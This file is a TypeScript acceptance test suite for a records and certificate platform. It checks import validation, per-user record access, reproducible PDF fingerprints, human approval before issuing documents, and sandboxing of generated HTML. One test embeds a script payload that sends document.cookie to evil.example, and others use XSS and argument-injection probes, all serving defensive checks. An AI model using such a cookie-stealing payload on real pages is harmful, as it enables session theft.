// Phase 4 acceptance criteria (plans/04-phases.md, "المرحلة 4"), one describe per checkbox, plus
// placement of outputs, versions, exports, verification and guard rails. Real onebase server.

import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { Server, must, type Result } from "./harness";
const errOf = (r: Result) => (r.ok ? "" : r.error);
import { buildFixture, type Fixture } from "./fixture";
import { buildOutputs, COLUMNS, COURSE_HEADERS, COURSE_ROWS, FIELDS, IDS, layoutFor, tool, xlsxBase64, type OutputsFixture } from "./outputsFixture";
import { renderPdf, parseLayout } from "../onebase/pdf";
import { tools } from "../onebase/tools/index";
import { ARTIFACT_CSP, buildSrcDoc, frameAttributes, SANDBOX } from "../src/sandbox";

let s: Server;
let f: Fixture;
let o: OutputsFixture;

beforeAll(async () => {
  s = await new Server().start();
  f = await buildFixture(s);
  o = await buildOutputs(s, f);
}, 120_000);

afterAll(async () => {
  await s?.stop();
});

const T = (k: string) => (f.tokens as any)[k] as string | undefined;
const sha = (b: Uint8Array | ArrayBuffer) => new Bun.CryptoHasher("sha256").update(b instanceof Uint8Array ? b : new Uint8Array(b)).digest("hex");

async function downloadDoc(token: string, documentId: string) {
  const link = must(await s.call("mutation", "documents:requestDownload", { documentId }, token));
  const res = await fetch(`${s.url}${link}`);
  expect(res.status).toBe(200);
  return new Uint8Array(await res.arrayBuffer());
}

async function newSet(name: string) {
  return must(await s.call("mutation", "records:createSet", { spaceId: f.spaces.S_plain, name, columns: COLUMNS, subjectColumn: "nid", subjectKind: "nationalId", uniqueBy: ["nid", "course"] }, T("mgr")));
}

describe("✓ an Excel file with missing columns or duplicate rows is rejected with a precise message, and none of it goes in", () => {
  test("missing column: named in the error; preview writes nothing; commit refused", async () => {
    const setId = await newSet("ناقص");
    const data = await xlsxBase64(["رقم الهوية", "الاسم", "الدورة"], [[IDS.mem, "x", "y"]]);
    const p = must(await s.call("action", "records:previewImport", { recordSetId: setId, fileName: "a.xlsx", dataBase64: data }, T("mgr")));
    expect(p.ok).toBe(false);
    expect(p.errors.join(" ")).toContain("أعمدة ناقصة");
    expect(p.errors.join(" ")).toContain("تاريخ الإتمام");
    const c = await s.call("action", "records:commitImport", { recordSetId: setId, fileName: "a.xlsx", dataBase64: data }, T("mgr"));
    expect(c.ok).toBe(false);
    expect(errOf(c)).toContain("تاريخ الإتمام");
    expect(must(await s.call("query", "records:imports", { recordSetId: setId }, T("mgr")))).toEqual([]);
    expect(must(await s.call("query", "records:rows", { recordSetId: setId }, T("mgr"))).rows).toEqual([]);
  });

  test("duplicate rows: both row numbers named; nothing imported, even the valid rows", async () => {
    const setId = await newSet("مكرر");
    const rows = [...COURSE_ROWS, [IDS.out, "موظف out", "السلامة المهنية", "2026-05-01", 8]]; // same (nid, course) as row 4
    const data = await xlsxBase64(COURSE_HEADERS, rows);
    const c = await s.call("action", "records:commitImport", { recordSetId: setId, fileName: "dup.xlsx", dataBase64: data }, T("mgr"));
    expect(c.ok).toBe(false);
    expect(errOf(c)).toContain("الصف 6");
    expect(errOf(c)).toContain("مكرر مع الصف 4");
    expect(must(await s.call("query", "records:rows", { recordSetId: setId }, T("mgr"))).rows).toEqual([]);
    expect(must(await s.call("query", "records:sets", { spaceId: f.spaces.S_plain }, T("mgr"))).find((x: any) => x._id === setId).currentVersion).toBe(0);
  });

  test("wrong type and empty required cell: row and column named", async () => {
    const setId = await newSet("أنواع");
    const data = await xlsxBase64(COURSE_HEADERS, [[IDS.mem, "x", "y", "ليس تاريخاً", "ثلاثون"], [IDS.out, "", "z", "2026-01-01", 1]]);
    const p = must(await s.call("action", "records:previewImport", { recordSetId: setId, fileName: "t.xlsx", dataBase64: data }, T("mgr")));
    expect(p.ok).toBe(false);
    const all = p.errors.join("\n");
    expect(all).toContain('الصف 2: القيمة في العمود "تاريخ الإتمام"');
    expect(all).toContain('الصف 2: القيمة في العمود "الساعات"');
    expect(all).toContain('الصف 3: العمود "الاسم" فارغ');
  });

  test("not an Excel file: refused", async () => {
    const setId = await newSet("ليس-اكسل");
    const p = must(await s.call("action", "records:previewImport", { recordSetId: setId, fileName: "x.xlsx", dataBase64: Buffer.from("hello").toString("base64") }, T("mgr")));
    expect(p.ok).toBe(false);
  });

  test("a valid file: preview, then every row in as a new dated version; the previous version is kept", async () => {
    const setId = await newSet("صالح");
    const data = await xlsxBase64(COURSE_HEADERS, COURSE_ROWS);
    const p = must(await s.call("action", "records:previewImport", { recordSetId: setId, fileName: "ok.xlsx", dataBase64: data }, T("mgr")));
    expect(p.ok).toBe(true);
    expect(p.rowCount).toBe(4);
    expect(p.sample[0]).toEqual({ nid: IDS.mem, name: "موظف mem", course: "إدارة المشاريع", date: "2026-01-15", hours: 30 });
    expect(must(await s.call("action", "records:commitImport", { recordSetId: setId, fileName: "ok.xlsx", dataBase64: data }, T("mgr")))).toEqual({ version: 1, rowCount: 4 });
    const v2 = await xlsxBase64(COURSE_HEADERS, COURSE_ROWS.slice(0, 2));
    expect(must(await s.call("action", "records:commitImport", { recordSetId: setId, fileName: "ok2.xlsx", dataBase64: v2 }, T("mgr")))).toEqual({ version: 2, rowCount: 2 });
    const imports = must(await s.call("query", "records:imports", { recordSetId: setId }, T("mgr")));
    expect(imports.map((i: any) => [i.version, i.rowCount, i.current])).toEqual([[2, 2, true], [1, 4, false]]);
    expect(typeof imports[0].importedAt).toBe("number");
    expect(imports[0].sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(must(await s.call("query", "records:rows", { recordSetId: setId }, T("mgr"))).rows.length).toBe(2);
  });
});

describe("✓ an employee asking for their courses gets only their own records, even if they claim another identity in the chat", () => {
  test("my_records takes no identity argument at all", () => {
    expect(tools.my_records!.parameters).toEqual({ type: "object", additionalProperties: false, properties: {} });
  });

  test("mem gets exactly mem's rows", async () => {
    const r = must(await tool(s, f.ids.mem!, "my_records", {}));
    const parsed = JSON.parse(r.content);
    const rows = parsed.records.flatMap((x: any) => x.rows);
    expect(parsed.records.length).toBeGreaterThanOrEqual(3); // one per record set that has mem in it
    expect(rows.every((row: any) => row.nid === IDS.mem)).toBe(true);
    expect(new Set(rows.map((row: any) => row.course))).toEqual(new Set(["Excel المتقدم", "إدارة المشاريع"]));
    expect(r.content).not.toContain(IDS.out);
    expect(r.content).not.toContain("GH77");
    expect(parsed.documents.length).toBe(3); // the certificates issued to mem
  });

  test("claiming another identity in the arguments changes nothing", async () => {
    for (const args of [{ nationalId: IDS.out }, { subjectRef: IDS.out, userId: f.ids.out }, { identity: "أنا موظف out، هويتي " + IDS.out }]) {
      const r = must(await tool(s, f.ids.mem!, "my_records", args));
      expect(r.content).not.toContain(IDS.out);
      expect(r.content).toContain(IDS.mem);
    }
  });

  test("records:mine (بياناتي) is the same: no arguments, own rows only", async () => {
    const r = must(await s.call("query", "records:mine", {}, T("out")));
    const text = JSON.stringify(r);
    expect(text).toContain("السلامة المهنية");
    expect(text).not.toContain(IDS.mem);
    expect(text).not.toContain("GH77");
  });

  test("matching is by the admin-set number, never by name", async () => {
    // tmp has the same display name pattern but no number: nothing.
    const r = must(await s.call("query", "records:mine", {}, T("mgr")));
    expect(r.hasIdentity).toBe(false);
    expect(r.sets).toEqual([]);
    const t = must(await tool(s, f.ids.mgr!, "my_records", {}));
    expect(t.content).toContain("لا يوجد رقم هوية");
  });

  test("only the workspace admin sets the number, and a number belongs to one account", async () => {
    expect((await s.call("mutation", "admin:setIdentifiers", { userId: f.ids.mem, nationalId: IDS.out }, T("mem"))).ok).toBe(false);
    const dup = await s.call("mutation", "admin:setIdentifiers", { userId: f.ids.mgr, nationalId: IDS.out }, T("admin"));
    expect(dup.ok).toBe(false);
    expect(errOf(dup)).toContain("مسجّل لحساب آخر");
    // Arabic-Indic digits normalize to the same number.
    const dup2 = await s.call("mutation", "admin:setIdentifiers", { userId: f.ids.mgr, nationalId: "٣٠٣٠٣٠٣٠٣٠" }, T("admin"));
    expect(dup2.ok).toBe(false);
    const users = must(await s.call("query", "admin:users", {}, T("admin")));
    expect(users.find((u: any) => u._id === f.ids.mem).nationalId).toBe(IDS.mem);
  });
});

describe("✓ an employee outside the records space can't query anyone else's records, in any form", () => {
  // out is not a member of S_plain or S_sens (S_every is readable by everyone by design).
  const scopes = () => [undefined, [f.spaces.S_plain, f.spaces.S_sens], [f.spaces.S_plain]];
  const argSets = () => [
    { recordSetId: o.sets.S_plain },
    { recordSetId: o.sets.S_sens },
    { subjectRef: IDS.mem },
    { subjectRef: IDS.ghost },
    { filters: { name: "GH77" } },
    { filters: { "الاسم": "موظف mem" } },
    {},
  ];

  test("query_records: denied or nothing from S_plain/S_sens, for every argument and scope", async () => {
    for (const scope of scopes()) {
      for (const args of argSets()) {
        const r = await tool(s, f.ids.out!, "query_records", args, scope);
        if (!r.ok) continue;
        const sets = JSON.parse(r.value.content.startsWith("[") ? r.value.content : "[]");
        for (const set of sets) expect([o.sets.S_plain, o.sets.S_sens]).not.toContain(set.recordSetId);
      }
    }
  });

  test("public functions: rows, sets, imports, documents, templates of S_plain/S_sens all denied", async () => {
    for (const sp of ["S_plain", "S_sens"] as const) {
      for (const [kind, fn, args] of [
        ["query", "records:rows", { recordSetId: o.sets[sp] }],
        ["query", "records:imports", { recordSetId: o.sets[sp] }],
        ["query", "records:sets", { spaceId: f.spaces[sp] }],
        ["query", "documents:list", { spaceId: f.spaces[sp] }],
        ["query", "templates:versions", { templateId: o.templates[sp] }],
      ] as const) {
        expect((await s.call(kind, fn, args, T("out"))).ok).toBe(false);
      }
    }
  });

  test("a member of the records space can (the difference is membership, not wording)", async () => {
    const r = must(await tool(s, f.ids.mem!, "query_records", { subjectRef: IDS.out, recordSetId: o.sets.S_sens }));
    expect(r.content).toContain("السلامة المهنية");
    expect(r.spaceIds).toEqual([f.spaces.S_sens]);
  });

  test("the turn's scope limits even a member", async () => {
    const r = await tool(s, f.ids.mem!, "query_records", { recordSetId: o.sets.S_sens }, [f.spaces.S_plain]);
    expect(r.ok).toBe(false);
  });

  test("query_records on a sensitive space is audited", async () => {
    const log = must(await s.call("query", "audit:list", { spaceId: f.spaces.S_sens }, T("mgr")));
    expect(log.some((e: any) => e.action === "records.query")).toBe(true);
  });
});

describe("✓ issuing the same certificate twice gives files with the same fingerprint", () => {
  test("re-rendering an issued document reproduces its sha256 exactly", async () => {
    for (const sp of ["S_plain", "S_every", "S_sens"] as const) {
      const r = must(await s.call("action", "documents:reproduce", { documentId: o.docs[sp] }, T("mgr")));
      expect(r.identical).toBe(true);
      expect(r.sha256).toBe(r.stored);
    }
  });

  test("the downloaded file has the stored sha256, every time", async () => {
    const list = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_plain }, T("mgr")));
    const d = list.find((x: any) => x._id === o.docs.S_plain);
    const a = await downloadDoc(T("mem")!, d._id);
    const b = await downloadDoc(T("mgr")!, d._id);
    expect(sha(a)).toBe(d.sha256);
    expect(sha(b)).toBe(d.sha256);
    expect(new TextDecoder().decode(a.slice(0, 5))).toBe("%PDF-");
  });

  test("asking again for the same certificate returns the same document (same serial, same file)", async () => {
    const recordId = await o.recordOf("S_plain", IDS.mem, "إدارة المشاريع");
    const again = must(await s.call("mutation", "documents:request", { templateId: o.templates.S_plain, recordId }, T("mem")));
    expect(again.existing).toBe(true);
    expect(again.documentId).toBe(o.docs.S_plain);
    const issued = must(await s.call("action", "documents:issue", { documentId: again.documentId }, T("mem")));
    const list = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_plain }, T("mgr")));
    const d = list.find((x: any) => x._id === o.docs.S_plain);
    expect(issued.sha256).toBe(d.sha256);
    expect(issued.serial).toBe(d.serial);
  });

  test("an independent render (this test process, not the server) of the same inputs gives the same bytes", async () => {
    const list = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_every }, T("mgr")));
    const d = list.find((x: any) => x._id === o.docs.S_every);
    const input = { layout: parseLayout(layoutFor("شهادة إتمام دورة"), FIELDS.map((x) => x.key)), background: null, data: d.data, serial: d.serial, verifyCode: d.verifyCode, issuedAt: d.issuedAt, title: `شهادة S_every ${d.serial}` };
    const one = await renderPdf(input);
    await Bun.sleep(1100); // a second later: no clock in the file
    const two = await renderPdf(input);
    expect(sha(one)).toBe(sha(two));
    expect(sha(one)).toBe(d.sha256);
    const text = new TextDecoder("latin1").decode(one);
    expect(text).not.toContain("pdf-lib");
    expect(text).toContain("/CreationDate (D:" + new Date(d.issuedAt).toISOString().slice(0, 10).replace(/-/g, ""));
    expect(text).toContain("/BaseFont /ReadexPro-Arabic"); // embedded font under a fixed name
  });

  test("the same data drafted from a re-import (same values, new version) renders the same bytes", async () => {
    // serial/code/date differ per document, so compare a direct render with fixed metadata.
    const input = { layout: parseLayout(layoutFor("شهادة"), ["name", "course", "date"]), background: null, data: { name: "س", course: "ص", date: "2026-01-01" }, serial: "OS-2026-000099", verifyCode: "AAAA-BBBB-CCCC", issuedAt: Date.UTC(2026, 0, 1), title: "t" };
    expect(sha(await renderPdf(input))).toBe(sha(await renderPdf({ ...input, data: { ...input.data } })));
  });
});

describe("✓ no path lets the model write text into an official document", () => {
  test("fill_template accepts two ids and nothing else", () => {
    const p = tools.fill_template!.parameters as any;
    expect(p.additionalProperties).toBe(false);
    expect(Object.keys(p.properties).sort()).toEqual(["recordId", "templateId"]);
    expect(p.required.sort()).toEqual(["recordId", "templateId"]);
  });

  test("extra arguments are ignored: the fields come from the record, by code", async () => {
    const recordId = await o.recordOf("S_plain", IDS.ghost, "التفاوض");
    const r = must(await tool(s, f.ids.mem!, "fill_template", { templateId: o.templates.S_plain, recordId, name: "INJECTED-XYZ", data: { name: "INJECTED-XYZ" }, text: "INJECTED-XYZ" }));
    expect(r.content).not.toContain("INJECTED");
    const list = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_plain }, T("mgr")));
    const docs = list.filter((d: any) => d.data.name === "شخص-بلا-حساب-GH77" && d.data.course === "التفاوض");
    expect(docs.length).toBeGreaterThan(0);
    for (const d of list) expect(JSON.stringify(d.data)).not.toContain("INJECTED");
  });

  test("no agent tool can create or edit templates or documents other than fill_template's ids", () => {
    const names = Object.keys(tools);
    const touching = names.filter((n) => /template|document|certificate|issue/i.test(n));
    expect(touching).toEqual(["fill_template"]);
  });

  test("the document request API takes ids only (no text fields)", async () => {
    const res = await fetch(`${s.url}/_admin/api/functions`, { method: "POST", headers: { Authorization: `Bearer ${s.adminKey}` }, body: "{}" });
    const fns: any[] = (await res.json()).value;
    const req = fns.find((x) => x.name === "documents:request");
    expect(JSON.stringify(req.args)).not.toMatch(/"string"/);
    const internalReq = fns.find((x) => x.name === "documents:requestForUser");
    expect(internalReq.visibility).toBe("internal");
  });

  test("a model-made output can't pass as an official document (no 'document' kind)", async () => {
    const r = await tool(s, f.ids.mem!, "create_artifact", { title: "شهادة", kind: "document", content: "x" });
    expect(r.ok).toBe(false);
  });

  test("templates are written only by space managers through their own session", async () => {
    const r = await s.call("action", "templates:saveVersion", { spaceId: f.spaces.S_plain, name: "x", layout: layoutFor("x"), fieldsSchema: FIELDS, dataBinding: { recordSetId: o.sets.S_plain, fields: { name: "name", course: "course", date: "date" } } }, T("mem"));
    expect(r.ok).toBe(false);
  });
});

describe("✓ an official document is never issued without a recorded human approval", () => {
  test("draft → issue is refused; approve → issue works; who approved is recorded", async () => {
    const recordId = await o.recordOf("S_plain", IDS.mem, "Excel المتقدم");
    let draft = must(await s.call("mutation", "documents:request", { templateId: o.templates.S_plain, recordId }, T("mem")));
    if (draft.status !== "draft") {
      must(await s.call("mutation", "documents:reject", { documentId: draft.documentId }, T("mgr")));
      draft = must(await s.call("mutation", "documents:request", { templateId: o.templates.S_plain, recordId }, T("mem")));
    }
    const early = await s.call("action", "documents:issue", { documentId: draft.documentId }, T("mem"));
    expect(early.ok).toBe(false);
    expect(errOf(early)).toContain("اعتماد");
    const early2 = await s.call("action", "documents:issue", { documentId: draft.documentId }, T("mgr"));
    expect(early2.ok).toBe(false);
    // A member can't approve, even their own request.
    expect((await s.call("mutation", "documents:approve", { documentId: draft.documentId }, T("mem"))).ok).toBe(false);
    must(await s.call("mutation", "documents:approve", { documentId: draft.documentId }, T("mgr")));
    const issued = must(await s.call("action", "documents:issue", { documentId: draft.documentId }, T("mem")));
    expect(issued.serial).toMatch(/^OS-\d{4}-\d{6}$/);
    const d = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_plain }, T("mgr"))).find((x: any) => x._id === draft.documentId);
    expect(d.status).toBe("issued");
    expect(d.approvedByName).toBe("موظف mgr");
    expect(d.issuedByName).toBe("موظف mem");
    const log = must(await s.call("query", "audit:list", { spaceId: f.spaces.S_plain }, T("mgr")));
    const approve = log.find((e: any) => e.action === "document.approve" && e.resourceId === draft.documentId);
    const issue = log.find((e: any) => e.action === "document.issue" && e.resourceId === draft.documentId);
    expect(approve.userName).toBe("موظف mgr");
    expect(issue.detail.approvedBy).toBe(f.ids.mgr);
  });

  test("a rejected draft can't be issued", async () => {
    const recordId = await o.recordOf("S_every", IDS.ghost, "التفاوض");
    const draft = must(await s.call("mutation", "documents:request", { templateId: o.templates.S_every, recordId }, T("mem")));
    must(await s.call("mutation", "documents:reject", { documentId: draft.documentId }, T("mgr")));
    expect((await s.call("action", "documents:issue", { documentId: draft.documentId }, T("mgr"))).ok).toBe(false);
  });

  test("only an approved template version can be used", async () => {
    const saved = must(await s.call("action", "templates:saveVersion", { spaceId: f.spaces.S_plain, name: "غير معتمد", layout: layoutFor("x"), fieldsSchema: FIELDS, dataBinding: { recordSetId: o.sets.S_plain, fields: { name: "name", course: "course", date: "date" } } }, T("mgr")));
    const r = await s.call("mutation", "documents:request", { templateId: saved.templateId, recordId: await o.recordOf("S_plain", IDS.mem) }, T("mem"));
    expect(r.ok).toBe(false);
    expect(errOf(r)).toContain("معتمدة");
  });
});

describe("✓ generated HTML can't reach the user's session or the network", () => {
  test("the frame is fully sandboxed: no allow-same-origin, no allow-scripts, nothing else", () => {
    const attrs = frameAttributes("<script>parent.localStorage</script>");
    expect(SANDBOX).toBe("");
    expect(attrs.sandbox).toBe("");
    expect(attrs.referrerPolicy).toBe("no-referrer");
  });

  test("the CSP blocks every network request and comes before any generated byte", () => {
    const evil = `<meta http-equiv="Content-Security-Policy" content="default-src *"><img src="https://evil.example/x.png"><script>fetch("https://evil.example/"+document.cookie)</script>`;
    const doc = buildSrcDoc(evil);
    const cspAt = doc.indexOf('http-equiv="Content-Security-Policy"');
    expect(cspAt).toBeGreaterThan(-1);
    expect(cspAt).toBeLessThan(doc.indexOf(evil));
    for (const d of ["default-src 'none'", "connect-src 'none'", "script-src 'none'", "frame-src 'none'", "form-action 'none'", "img-src data:", "base-uri 'none'"]) expect(ARTIFACT_CSP).toContain(d);
    // A second (generated) CSP can only add restrictions, never relax the first.
  });

  test("HTML outputs are never served from the app's origin by the server (no route renders them)", async () => {
    const r = must(await tool(s, f.ids.mem!, "create_artifact", { title: "صفحة", kind: "html", content: "<h1>x</h1><script>alert(1)</script>" }));
    const id = r.artifactIds[0];
    for (const path of [`/artifact?id=${id}`, `/artifacts/${id}`, `/download?artifactId=${id}`]) {
      const g = await s.get(path, T("mem"));
      expect(g.text).not.toContain("<script>alert(1)</script>");
    }
    // The content only travels as JSON data (artifacts:open), to be put in the sandboxed frame.
    const opened = must(await s.call("mutation", "artifacts:open", { artifactId: id }, T("mem")));
    expect(opened.kind).toBe("html");
  });
});

describe("outputs: placement, versions, transfers, export", () => {
  test("built on one space → saved there; on a sensitive one → stays there and is classified sensitive", async () => {
    const plain = must(await tool(s, f.ids.mem!, "create_artifact", { title: "ملخص", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_plain }] }));
    expect(plain.spaceIds).toEqual([f.spaces.S_plain]);
    const personal = must(await tool(s, f.ids.mem!, "create_artifact", { title: "ملخص", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_plain }], spaceId: f.spaces.P_mem }));
    expect(personal.spaceIds).toEqual([f.spaces.P_mem]);
    const sens = must(await tool(s, f.ids.mem!, "create_artifact", { title: "حساس", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_sens }] }));
    expect(sens.spaceIds).toEqual([f.spaces.S_sens]);
    expect(sens.content).toContain("حسّاسة");
    const out = await tool(s, f.ids.mem!, "create_artifact", { title: "تسريب", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_sens }], spaceId: f.spaces.P_mem });
    expect(out.ok).toBe(false);
    const mixed = await tool(s, f.ids.mem!, "create_artifact", { title: "دمج", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_sens }, { type: "file", id: f.files.S_plain }] });
    expect(mixed.ok).toBe(false);
    const multi = must(await tool(s, f.ids.mem!, "create_artifact", { title: "متعدد", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_every }, { type: "file", id: f.files.S_plain }] }));
    expect(multi.spaceIds).toEqual([f.spaces.P_mem]);
  });

  test("sources the user can't read, or outside the turn's scope, are refused", async () => {
    expect((await tool(s, f.ids.out!, "create_artifact", { title: "x", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_plain }] })).ok).toBe(false);
    expect((await tool(s, f.ids.mem!, "create_artifact", { title: "x", kind: "markdown", content: "x", sources: [{ type: "file", id: f.files.S_plain }] }, [f.spaces.S_every])).ok).toBe(false);
  });

  test("an output from a sensitive space leaves it only with its manager's approval", async () => {
    const r = must(await tool(s, f.ids.mem!, "create_artifact", { title: "تقرير حساس", kind: "markdown", content: "x", sources: [{ type: "recordSet", id: o.sets.S_sens }] }));
    const id = r.artifactIds[0];
    expect((await s.call("mutation", "artifacts:move", { artifactId: id, toSpaceId: f.spaces.P_mem }, T("mem"))).ok).toBe(false);
    const transferId = must(await s.call("mutation", "artifacts:requestTransfer", { artifactId: id, toSpaceId: f.spaces.P_mem }, T("mem")));
    const pending = must(await s.call("query", "artifacts:transfers", { spaceId: f.spaces.S_sens }, T("mgr")));
    expect(pending.some((p: any) => p._id === transferId)).toBe(true);
    expect((await s.call("mutation", "artifacts:decideTransfer", { transferId, approve: true }, T("mem"))).ok).toBe(false);
    must(await s.call("mutation", "artifacts:decideTransfer", { transferId, approve: true }, T("mgr")));
    const mine = must(await s.call("query", "artifacts:list", { spaceId: f.spaces.P_mem }, T("mem")));
    expect(mine.some((a: any) => a._id === id && a.classification === "sensitive")).toBe(true);
    const log = must(await s.call("query", "audit:list", { spaceId: f.spaces.S_sens }, T("mgr")));
    expect(log.some((e: any) => e.action === "artifact.transfer_approve" && e.resourceId === id)).toBe(true);
  });

  test("update_artifact adds versions; old versions stay readable", async () => {
    const r = must(await tool(s, f.ids.mem!, "create_artifact", { title: "مسودة", kind: "markdown", content: "v1" }));
    const id = r.artifactIds[0];
    must(await tool(s, f.ids.mem!, "update_artifact", { artifactId: id, content: "v2", note: "تعديل" }));
    const v = must(await s.call("query", "artifacts:versions", { artifactId: id }, T("mem")));
    expect(v.versions.map((x: any) => x.version)).toEqual([2, 1]);
    expect(must(await s.call("mutation", "artifacts:open", { artifactId: id, version: 1 }, T("mem"))).content).toBe("v1");
    expect(must(await s.call("mutation", "artifacts:open", { artifactId: id }, T("mem"))).content).toBe("v2");
    expect((await tool(s, f.ids.out!, "update_artifact", { artifactId: id, content: "hijack" })).ok).toBe(false);
  });

  test("tables export to CSV (UTF-8 BOM) and XLSX", async () => {
    const r = must(await tool(s, f.ids.mem!, "create_artifact", { title: "درجات", kind: "table", table: { columns: ["الاسم", "الدرجة"], rows: [["سارة", 95], ["علي, \"ب\"", 80]] } }));
    const id = r.artifactIds[0];
    const csv = must(await s.call("action", "artifacts:exportTable", { artifactId: id, format: "csv" }, T("mem")));
    const text = Buffer.from(csv.base64, "base64").toString("utf8");
    expect(text.startsWith("﻿الاسم,الدرجة\r\nسارة,95\r\n")).toBe(true);
    expect(text).toContain('"علي, ""ب"""');
    const x = must(await s.call("action", "artifacts:exportTable", { artifactId: id, format: "xlsx" }, T("mem")));
    const ExcelJS = (await import("exceljs")).default;
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(Buffer.from(x.base64, "base64") as any);
    expect(wb.worksheets[0]!.getRow(2).values).toEqual([undefined, "سارة", 95]);
  });

  test("opening an output in a sensitive space is audited", async () => {
    must(await s.call("mutation", "artifacts:open", { artifactId: o.artifacts.S_sens }, T("rdr")));
    const log = must(await s.call("query", "audit:list", { spaceId: f.spaces.S_sens }, T("mgr")));
    expect(log.some((e: any) => e.action === "artifact.open" && e.userId === f.ids.rdr)).toBe(true);
  });
});

describe("verification and the subject's own documents", () => {
  test("GET /verify?code= confirms a real document without sign-in; a wrong code doesn't", async () => {
    const d = must(await s.call("query", "documents:list", { spaceId: f.spaces.S_sens }, T("mgr"))).find((x: any) => x._id === o.docs.S_sens);
    const ok = await s.get(`/verify?code=${encodeURIComponent(d.verifyCode)}`);
    expect(ok.status).toBe(200);
    expect(ok.text).toContain(d.serial);
    expect(ok.text).toContain(d.sha256);
    expect(ok.text).not.toContain("موظف mem"); // no personal data on the public page
    expect(ok.headers.get("content-security-policy")).toContain("default-src 'none'");
    const bad = await s.get(`/verify?code=ZZZZ-ZZZZ-ZZZZ`);
    expect(bad.status).toBe(404);
    const xss = await s.get(`/verify?code=${encodeURIComponent('"><script>x</script>')}`);
    expect(xss.text).not.toContain("<script>x</script>");
    expect(must(await s.call("query", "documents:verify", { code: d.verifyCode.toLowerCase() }))).toMatchObject({ valid: true, serial: d.serial });
  });

  test("POST /verify with the PDF says whether this exact file was issued", async () => {
    const bytes = await downloadDoc(T("mem")!, o.docs.S_plain!);
    const ok = await fetch(`${s.url}/verify`, { method: "POST", body: bytes });
    expect(ok.status).toBe(200);
    expect((await ok.json()).valid).toBe(true);
    const tampered = bytes.slice();
    tampered[tampered.length - 20] ^= 1;
    const bad = await fetch(`${s.url}/verify`, { method: "POST", body: tampered });
    expect((await bad.json()).valid).toBe(false);
  });

  test("the subject can download their own certificate from a space they're not in; others can't", async () => {
    // A certificate for out, issued in S_plain (out is not a member there).
    const recordId = await o.recordOf("S_plain", IDS.out, "السلامة المهنية");
    let d = must(await s.call("mutation", "documents:request", { templateId: o.templates.S_plain, recordId }, T("mem")));
    if (d.status === "draft") must(await s.call("mutation", "documents:approve", { documentId: d.documentId }, T("mgr")));
    if (d.status !== "issued") must(await s.call("action", "documents:issue", { documentId: d.documentId }, T("mgr")));
    const mine = must(await s.call("query", "records:mine", {}, T("out")));
    expect(mine.documents.some((x: any) => x._id === d.documentId)).toBe(true);
    const bytes = await downloadDoc(T("out")!, d.documentId);
    expect(new TextDecoder().decode(bytes.slice(0, 5))).toBe("%PDF-");
    expect((await s.call("mutation", "documents:requestDownload", { documentId: d.documentId }, T("rdr"))).ok).toBe(true); // rdr reads S_plain
    // tmp is active, not in S_plain, no number: nothing.
    const tmpToken = (await s.auth("signIn", f.emails.tmp!, "password-123")).token;
    expect((await s.call("mutation", "documents:requestDownload", { documentId: d.documentId }, tmpToken)).ok).toBe(false);
  });

  test("download links are single-use and storage ids never reach the client", async () => {
    const link = must(await s.call("mutation", "documents:requestDownload", { documentId: o.docs.S_plain }, T("mem")));
    expect((await s.get(link)).status).toBe(200);
    expect((await s.get(link)).status).toBe(404);
    const texts = [];
    for (const sp of ["S_plain", "S_every", "S_sens"] as const) {
      texts.push(JSON.stringify(await s.call("query", "documents:list", { spaceId: f.spaces[sp] }, T("mgr"))));
      texts.push(JSON.stringify(await s.call("query", "templates:versions", { templateId: o.templates[sp] }, T("mgr"))));
      texts.push(JSON.stringify(await s.call("query", "records:imports", { recordSetId: o.sets[sp] }, T("mgr"))));
      texts.push(JSON.stringify(await s.call("query", "artifacts:list", { spaceId: f.spaces[sp] }, T("mgr"))));
    }
    texts.push(JSON.stringify(await s.call("query", "records:mine", {}, T("mem"))));
    const all = texts.join("\n");
    expect(all).not.toContain("storageId");
    expect(all).not.toContain("/api/storage/");
  });
});
